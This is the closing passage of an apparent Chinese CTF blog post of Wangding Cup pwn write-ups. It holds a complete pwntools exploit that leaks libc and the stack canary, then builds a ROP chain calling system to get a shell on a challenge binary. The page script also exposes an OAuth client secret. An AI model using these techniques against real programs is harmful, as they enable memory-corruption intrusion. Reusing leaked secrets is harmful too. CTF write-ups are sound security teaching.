+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'sp'</span>,<span class="string">'-h'</span>,<span class="string">'-l'</span>,<span class="string">'105'</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r = <span class="keyword">lambda</span> x:p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>:p.recvline</span><br><span class="line">ru = <span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:p.recvuntil(x,drop=<span class="keyword">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x:p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line">rn = <span class="keyword">lambda</span> x:p.recvn(x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">print</span> <span class="string">'pidof is %s '</span> % pidof(p)</span><br><span class="line">  raw_input(<span class="string">'waiting for debug'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makep</span><span class="params">(ip=<span class="string">''</span>,port=<span class="number">0</span>,binary=<span class="string">''</span>)</span>:</span></span><br><span class="line">  <span class="keyword">global</span> p</span><br><span class="line">  <span class="keyword">if</span> ip <span class="keyword">and</span> port:</span><br><span class="line">      p = remote(ip,port)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">      p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c1</span><span class="params">(payload)</span>:</span></span><br><span class="line">    sla(<span class="string">"option:"</span>,<span class="string">'1'</span>)</span><br><span class="line">    sla(<span class="string">"once"</span>,payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c2</span><span class="params">(payload,level)</span>:</span></span><br><span class="line">    sla(<span class="string">"option:"</span>,<span class="string">'2'</span>)</span><br><span class="line">    sla(<span class="string">"bored"</span>,payload)</span><br><span class="line">    <span class="keyword">while</span>(level &gt; <span class="number">1</span>):</span><br><span class="line">        sla(<span class="string">"y/n"</span>,<span class="string">'n'</span>)</span><br><span class="line">        sla(<span class="string">"..."</span>,<span class="string">'nnnnnnn'</span>)</span><br><span class="line">        level = level <span class="number">-1</span></span><br><span class="line">    sla(<span class="string">"y/n"</span>,<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c3</span><span class="params">(payload,)</span>:</span></span><br><span class="line">    sla(<span class="string">"option:"</span>,<span class="string">'3'</span>)</span><br><span class="line">    sla(<span class="string">"?"</span>,payload)</span><br><span class="line">    <span class="keyword">return</span> ru(<span class="string">"G"</span>)[:<span class="number">-1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c4</span><span class="params">(payload)</span>:</span></span><br><span class="line">    sla(<span class="string">"option:"</span>,<span class="string">'9011'</span>)</span><br><span class="line">    sla(<span class="string">"code:"</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    makep(binary=<span class="string">"./pwn"</span>)</span><br><span class="line">    data = c3(<span class="string">"%a"</span>)</span><br><span class="line">    <span class="keyword">print</span> data</span><br><span class="line">    data = <span class="string">'0x'</span> +  data[<span class="number">7</span>:<span class="number">19</span>]</span><br><span class="line">    libc = int(data,<span class="number">16</span>) - <span class="number">0x3c56a3</span></span><br><span class="line">    success(<span class="string">"libc is "</span> + hex(libc))</span><br><span class="line">    hint()</span><br><span class="line">    system = libc + <span class="number">0x45390</span></span><br><span class="line">    c2(<span class="string">'AAAA'</span>,<span class="number">100</span>)</span><br><span class="line">    c1(<span class="string">'A'</span>*<span class="number">0xa8</span>)</span><br><span class="line">    ru(<span class="string">'A'</span>*<span class="number">0xa8</span>+<span class="string">'\n'</span>)</span><br><span class="line">    canary = <span class="string">'\x00'</span>+rn(<span class="number">7</span>) </span><br><span class="line">    canary = u64(canary)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1024</span>):</span><br><span class="line">        c4(<span class="string">"AAAAAAA"</span>)</span><br><span class="line">    success(<span class="string">"canary is "</span> + hex(canary))</span><br><span class="line">    pop_rdi = <span class="number">0x0000000400c53</span></span><br><span class="line">    payload = <span class="string">"A"</span>*<span class="number">8</span> + p64(canary) + p64(<span class="number">0x1</span>) + p64(pop_rdi) + p64(<span class="number">0x6020b0</span>) + p64(system) +<span class="string">"ls\x00"</span></span><br><span class="line">    c2(payload,<span class="number">0</span>)</span><br><span class="line">    hint()</span><br><span class="line">    c4(<span class="string">"\x00"</span>*<span class="number">8</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/01/bctf2018-core/" rel="next" title="bctf2018-core">
+                <i class="fa fa-chevron-left"></i> bctf2018-core
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      
+        <div onclick="showGitment()" id="gitment-display-button">显示 Gitment 评论</div>
+        <div id="gitment-container" style="display:none"></div>
+      
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">greyd0g</p>
+              <p class="site-description motion-element" itemprop="description">day day up</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.lovei.org" title="腹黑's Blog" target="_blank">腹黑's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.blogsir.com.cn" title="江sir's Blog" target="_blank">江sir's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://sec2hack.com/" title="Wfox's Blog" target="_blank">Wfox's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://brucetg.github.io/" title="Brucetg's Blog" target="_blank">Brucetg's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/whklhhhh" title="奈沙夜影's Blog" target="_blank">奈沙夜影's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cyto.top/" title="Cytosineの's Blog" target="_blank">Cytosineの's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.smallflower.xin/" title="小花' Blog" target="_blank">小花' Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.get1t.cn/" title="FraMeQ's Blog" target="_blank">FraMeQ's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#网鼎杯pwn部分wp"><span class="nav-number">1.</span> <span class="nav-text">网鼎杯pwn部分wp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#guess"><span class="nav-number">2.</span> <span class="nav-text">guess</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#blind"><span class="nav-number">3.</span> <span class="nav-text">blind</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easycoin"><span class="nav-number">4.</span> <span class="nav-text">easycoin</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap"><span class="nav-number">4.1.</span> <span class="nav-text">babyheap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easyFmt"><span class="nav-number">5.</span> <span class="nav-text">easyFmt</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fgo"><span class="nav-number">6.</span> <span class="nav-text">fgo</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hvm"><span class="nav-number">7.</span> <span class="nav-text">hvm</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#soEasy"><span class="nav-number">7.1.</span> <span class="nav-text">soEasy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pesp"><span class="nav-number">7.2.</span> <span class="nav-text">pesp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#note"><span class="nav-number">7.3.</span> <span class="nav-text">note</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#impossible"><span class="nav-number">8.</span> <span class="nav-text">impossible</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">greyd0g</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css">
+        <script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+      <style>
+        a.gitment-editor-footer-tip { display: none; }
+        .gitment-container.gitment-footer-container { display: none; }
+      </style>
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitmint({
+            id: window.location.pathname, 
+            owner: 'greyd0g',
+            repo: 'gitcomment',
+            
+            lang: "" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
+            
+            oauth: {
+            
+            
+                client_secret: '49e64e3c97f36a8034c37a86dfa044a8be29208e',
+            
+                client_id: '1a762312d58b3f30d273'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      function showGitment(){
+        document.getElementById("gitment-display-button").style.display = "none";
+        document.getElementById("gitment-container").style.display = "block";
+        renderGitment();
+      }
+      
+      </script>
+    
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+</body>
+</html>
